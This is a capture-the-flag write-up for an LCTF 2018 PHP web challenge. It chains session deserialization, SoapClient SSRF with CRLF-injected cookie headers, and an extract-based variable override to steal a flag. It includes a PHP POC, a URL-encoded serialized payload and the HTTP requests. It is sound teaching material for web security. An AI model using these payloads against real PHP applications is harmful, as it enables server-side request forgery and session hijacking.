### References

- [@N0rth3ty, 从LCTF WEB签到题看PHP反序列化, 2018-11-20](https://xz.aliyun.com/t/3336)

**Tag: Session unserialize, Variable override, SoapClient**

1.find flag.php and the hint is:

```php
only localhost can get flag!
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
    $_SESSION['flag'] = $flag;
}
```

It's clear that SSRF needs to be used here. SSRF can be triggered using the `SoapClient` unserialize.

Since the flag will be inserted into `$session`, we need access it with Cookie containing the `PHPSESSID` to generate this session file.

POC:

```php
<?php
$target = "http://127.0.0.1/flag.php";
$a = new SoapClient(null,array(
    'location'   => $target,
    'user_agent' => "test\r\nCookie: PHPSESSID=plzgivemeflag\r\n",
    'uri'        => "test"
));
$poc = urlencode(serialize($a));
echo $poc;
```

2.The problem is we can't find any unserialize operations in the `index.php` page. Then i noticed the `session_start()` function, means that we can use session unserialize.

The default `session.serialize_handler` is `php`, therefore, we should change the `serialize_handler` on the index page to `php_serialize`:

```tex
POST /index.php?f=ini_set&name=|[poc data here] HTTP/1.1
...
serialize_handler=php_serialize
```

But the `ini_set` function does not accept array argument. In fact, as you can see in the php manual, the [session_start](https://www.php.net/manual/en/function.session-start) function can also set options and use array as the parameter.

So the session file can be generated with the following poc:

```tex
POST /index.php?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A39%3A%22test%0D%0ACookie%3A+PHPSESSID%3Dplzgivemeflag%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1
...
serialize_handler=php_serialize
```

Don't forget the `|` character ;)

3.Unserialize is automatically triggered when the page is reloaded, however, SSRF will not be triggered, the `__call` magic function is need.

So we also need to call a method in that object that does not exist. Variable overrides come in handy:

```php
$b = 'implode';
call_user_func($_GET['f'], $_POST);
...
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
```

Here you can use the `extract` function to override `$b` to `call_user_func`:

```tex
POST /index.php?f=extract HTTP/1.1
...
b=call_user_func
```

This will call the welcome_to_the_lctf2018 function in the session object we constructed and trigger the `__call` method.

Finally, just change the cookie to the one we set in SSRF POC to get the flag

![](https://i.imgur.com/ZcosxmV.png)

